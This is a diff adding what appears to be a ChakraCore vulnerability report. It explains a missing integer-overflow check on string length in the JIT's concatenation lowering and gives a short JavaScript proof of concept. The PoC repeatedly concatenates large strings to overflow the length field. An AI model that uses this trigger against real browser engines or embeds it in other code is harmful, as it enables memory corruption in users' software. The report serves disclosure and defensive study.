@@ -1,0 +1,28 @@
+/*
+The method "Lowerer::LowerSetConcatStrMultiItem" is used to generate machine code to concatenate strings.
+Here's a snippet of the method.
+void Lowerer::LowerSetConcatStrMultiItem(IR::Instr * instr)
+{
+    ...
+    IR::IndirOpnd * dstLength = IR::IndirOpnd::New(concatStrOpnd, Js::ConcatStringMulti::GetOffsetOfcharLength(), TyUint32, func);
+    ...
+    InsertAdd(false, dstLength, dstLength, srcLength, instr); <<------ (a)
+    ...
+}
+
+At (a), there's no check for integer overflow.
+
+Note: Chakra uses string chains to handle concatenated strings(the ConcatString class). So it doesn't require much memory to trigger the bug.
+
+PoC:
+*/
+
+let a = '';
+let b = 'A'.repeat(0x10000);
+for (let i = 0; i < 0x10000; i++) {
+    a = 'BBBBBBBBB' + a + b;
+}
+
+print(a.length);
+print(b.length);
+print(a[0]);
